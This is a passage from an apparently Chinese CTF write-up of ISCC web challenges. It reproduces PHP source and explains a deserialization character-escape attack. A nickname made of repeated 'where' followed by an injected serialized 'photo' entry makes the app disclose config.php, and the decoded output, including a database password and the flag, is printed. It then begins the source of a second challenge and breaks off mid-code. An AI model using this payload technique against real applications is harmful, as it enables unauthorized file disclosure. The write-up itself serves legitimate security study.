class="hljs-string">&#x27;password&#x27;</span>]) &#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$username</span>) &lt; <span class="hljs-number">3</span> <span class="hljs-keyword">or</span> strlen(<span class="hljs-variable">$username</span>) &gt; <span class="hljs-number">16</span>) <br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid user name&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$password</span>) &lt; <span class="hljs-number">3</span> <span class="hljs-keyword">or</span> strlen(<span class="hljs-variable">$password</span>) &gt; <span class="hljs-number">16</span>) <br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid password&#x27;</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$user</span>-&gt;is_exists(<span class="hljs-variable">$username</span>)) &#123;<br><span class="hljs-variable">$user</span>-&gt;register(<span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Register OK!&lt;a href=&quot;index.php&quot;&gt;Please Login&lt;/a&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;User name Already Exists&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>profile.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Login First&#x27;</span>);<br>&#125;<br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$profile</span>=<span class="hljs-variable">$user</span>-&gt;show_profile(<span class="hljs-variable">$username</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$profile</span>  == <span class="hljs-literal">null</span>) &#123;<br>header(<span class="hljs-string">&#x27;Location: update.php&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$profile</span> = unserialize(<span class="hljs-variable">$profile</span>);<br><span class="hljs-variable">$phone</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>];<br><span class="hljs-variable">$email</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>];<br><span class="hljs-variable">$nickname</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>];<br><span class="hljs-variable">$photo</span> = base64_encode(file_get_contents(<span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>]));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>update.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Login First&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;photo&#x27;</span>]) &#123;<br><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>]))<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid phone&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>]))<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid email&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]) || strlen(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]) &gt; <span class="hljs-number">10</span>)<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid nickname&#x27;</span>);<br><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;photo&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &lt; <span class="hljs-number">5</span> <span class="hljs-keyword">or</span> <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">1000000</span>)<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Photo size error&#x27;</span>);<br><br>move_uploaded_file(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-string">&#x27;upload/&#x27;</span> . md5(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>]));<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>];<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>];<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>];<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>] = <span class="hljs-string">&#x27;upload/&#x27;</span> . md5(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br><br><span class="hljs-variable">$user</span>-&gt;update_profile(<span class="hljs-variable">$username</span>, serialize(<span class="hljs-variable">$profile</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>1.审计代码</strong></p><ul><li><p>config.php<br>flag在这里</p></li><li><p>register.php<br>注册账号，对帐号密码长度做出限制</p></li><li><p>profile.php<br>（1）将序列化后的用户信息进行了反序列化，且读取了上传的 photo 文件内容<br>（2）用base64编码对上传文件进行了读取和显示</p></li><li><p>update.php<br>（1）phone 长度为11位；<br>（2）nickname长度小于 10 位，且只能为字母和数字；<br>（3）将用户填写的 phone、email、nickname 以及上传的文件进行序列化</p></li><li><p>class.php<br>存在参数过滤，filter 中将 ‘select’, ‘insert’, ‘update’, ‘delete’, ‘where’ 等词用 ‘hacker’ 替换掉.</p></li></ul><p>存在参数过滤，where被替换成hacker，长度加1</p><p><strong>2.序列化profile</strong><br>update.php中POST提交完后对$profile进行序列化操作</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$profile</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] = <span class="hljs-string">&#x27;18288669977&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>] = <span class="hljs-string">&#x27;2233445588@qq.com&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>] = <span class="hljs-string">&#x27;xiaom&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>] = <span class="hljs-string">&#x27;config.php&#x27;</span>;<br><br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$profile</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>结果为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;phone&quot;</span>;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;18288669977&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;email&quot;</span>;s:<span class="hljs-number">17</span>:<span class="hljs-string">&quot;2233445588@qq.com&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;nickname&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;xiaom&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;photo&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;config.php&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>下面可以利用php反序列化字符逃逸</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">PHP在反序列化时，从左往右读取数据类型及长度，且只读取其中规定长度的数据，即当数据的长度大于规定的长度，后面还有数据也不再读取，而后面不再读取的数据，就会被挤到下一个数据项中。<br></code></pre></td></tr></table></figure><p><strong>3.反序列化字符逃逸</strong><br>这里需要构造超出长度的数据，将被挤出来的数据形成可以读取config.php 的数据项</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;;&#125;s:5:&quot;</span>photo<span class="hljs-string">&quot;;s:10:&quot;</span>config.php<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>上面的字符串一共34个字符，所以需要在 nickname 处多添加34位长的数据，才能将这段数据挤到 photo 的位置上去。</p><p>class.php代码中存在过滤， <code>where</code> 被替换成了 <code>hacker</code>，此时字符串的长度加 1 ，如果在 nickname 处填进 34 个<code>where</code>，就会被替换成 34 个 <code>hacker</code>，即nickname 的长度超出了 34 位。</p><p>得到payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="hljs-string">&quot;;&#125;s:5:&quot;</span>photo<span class="hljs-string">&quot;;s:10:&quot;</span>config.php<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>访问register.php，注册账号，然后登陆,在Nickname处填入上面的payload</p><p><img src="https://img-blog.csdnimg.cn/20210504125229650.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>抓包，将Nickname修改为Nickname[]数组类型<br><img src="https://img-blog.csdnimg.cn/20210504125326751.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>4.利用base64编码读取flag</strong><br>放包，点击超链接跳转到profile.php页面，查看源码<br><img src="https://img-blog.csdnimg.cn/20210504125526632.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>一段Base编码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">PD9waHAKJGNvbmZpZ1snaG9zdG5hbWUnXSA9ICcxMjcuMC4wLjEnOwokY29uZmlnWyd1c2VybmFtZSddID0gJ3Jvb3QnOwokY29uZmlnWydwYXNzd29yZCddID0gJ3F3ZXJ0eXVpb3AnOwokY29uZmlnWydkYXRhYmFzZSddID0gJ2NoYWxsZW5nZXMnOwokZmxhZyA9ICdJU0NDe3doYXRfaXNAdGhlJl9uaWNrbmFtZSo/MTExMjIzNH0nOwo/Pgo=<br></code></pre></td></tr></table></figure><p>Base64解码得到flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;hostname&#x27;</span>] = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;root&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;password&#x27;</span>] = <span class="hljs-string">&#x27;qwertyuiop&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;database&#x27;</span>] = <span class="hljs-string">&#x27;challenges&#x27;</span>;<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;ISCC&#123;what_is@the&amp;_nickname*?1112234&#125;&#x27;</span>;<br>?&gt;<br></code></pre></td></tr></table></figure><h2 id="which-is-the-true-iscc"><a href="#which-is-the-true-iscc" class="headerlink" title="which is the true iscc"></a>which is the true iscc</h2><blockquote><p>小夏同学很想知道ISCC到底是什么，不过上网后的搜索让他更加迷惑了——怎么有这么多ISCC？？到底哪个ISCC是真的呢？你能帮他找到真正的ISCC吗？<br>题目入口：<a href="http://39.96.91.106:7050/">http://39.96.91.106:7050</a></p></blockquote><p>访问题目地址,查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!--<br>&lt;a href=<span class="hljs-string">&quot;/?whatareyounongshane=src&quot;</span>&gt;我真的是源码?&lt;/a&gt;<br>&lt;a href=<span class="hljs-string">&quot;/?whatareyounongshane=cmd&quot;</span>&gt;干点好事!&lt;/a&gt;<br>&lt;a href=<span class="hljs-string">&quot;/?whatareyounongshane=upload&quot;</span>&gt;送点东西!&lt;/a&gt;<br>&lt;a href=<span class="hljs-string">&quot;/?whatareyounongshane=tellmetruth&quot;</span>&gt;快告诉我真相!&lt;/a&gt;<br>--&gt;<br></code></pre></td></tr></table></figure><p>按照提示，访问/?whatareyounongshane=src，得到源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>session_start();<br>ini_set(<span class="hljs-string">&#x27;max_execution_time&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>);<br>set_time_limit(<span class="hljs-number">5</span>);<br><br><span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;new&quot;</span>;<br><span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;whoami&quot;</span>;<br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$is_unser_finished</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$iscc_file</span> = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ISCC_Upload</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$is_upload</span>;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;whoami&quot;</span>;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = randstr(<span class="hljs-number">14</span>);<br>        <span class="hljs-variable">$is_upload</span> = (count(<span class="hljs-variable">$_FILES</span>) &gt; <span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$is_upload</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$status</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$iscc_file</span>;<br>        <span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;upload_fail&quot;</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$is_upload</span>) &#123;<br><br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_FILES</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>)<br>                <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable">$value</span>;<br><br><br>            <span class="hljs-keyword">if</span>(is_uploaded_file(<span class="hljs-variable">$iscc_file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>])) &#123;<br><br>                <span class="hljs-variable">$check</span> = @getimagesize(<span class="hljs-variable">$iscc_file</span>[<span class="hljs-string">&quot;tmp_name&quot;</span>]);<br><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$check</span> !== <span class="hljs-literal">false</span>) &#123;<br><br>                    <span class="hljs-variable">$target_dir</span> = <span class="hljs-string">&quot;/var/tmp/&quot;</span>;<br>                    <span class="hljs-variable">$target_file</span> = <span class="hljs-variable">$target_dir</span> . randstr(<span class="hljs-number">10</span>);<br><br>                    <span class="hljs-keyword">if</span> (file_exists(<span class="hljs-variable">$target_file</span>)) &#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;想啥呢？有东西了……&lt;br&gt;&quot;</span>;<br>                        finalize();<br>                        <span class="hljs-keyword">exit</span>;<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$iscc_file</span>[<span class="hljs-string">&quot;size&quot;</span>] &gt; <span class="hljs-number">500000</span>) &#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;东西塞不进去~&lt;br&gt;&quot;</span>;<br>                        finalize();<br>                        <span class="hljs-keyword">exit</span>;<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$iscc_file</span>[<span class="hljs-string">&quot;tmp_name&quot;</span>], <span class="hljs-variable">$target_file</span>)) &#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;我拿到了！&lt;br&gt;&quot;</span>;<br>                        <span class="hljs-variable">$iscc_file</span> = <span class="hljs-variable">$target_file</span>;<br>                        <span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;upload_ok&quot;</span>;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;拿不到:(&lt;br&gt;&quot;</span>;<br>                        finalize();<br>                        <span class="hljs-keyword">exit</span>;<br>                    &#125;<br><br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    finalize();<br>                    <span class="hljs-keyword">exit</span>;<br>                &#125;<br><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你真是个天才!&lt;br&gt;&quot;</span>;<br>                finalize();<br>                <span class="hljs-keyword">exit</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ISCC_ResetCMD</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$new_cmd</span> = <span class="hljs-string">&quot;echo &#x27;新新世界，发号施令!&#x27;&quot;</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$is_upload</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$status</span>;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = randstr(<span class="hljs-number">14</span>);<br>        <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;new_cmd)) &#123;<br>            <span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;error&quot;</span>;<br>            <span class="hljs-variable">$error</span> = <span class="hljs-string">&quot;你这罐子是空的!&quot;</span>;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-variable">$error</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!is_string(<span class="hljs-keyword">$this</span>-&gt;new_cmd)) &#123;<br>            <span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;error&quot;</span>;<br>            <span class="hljs-variable">$error</span> = <span 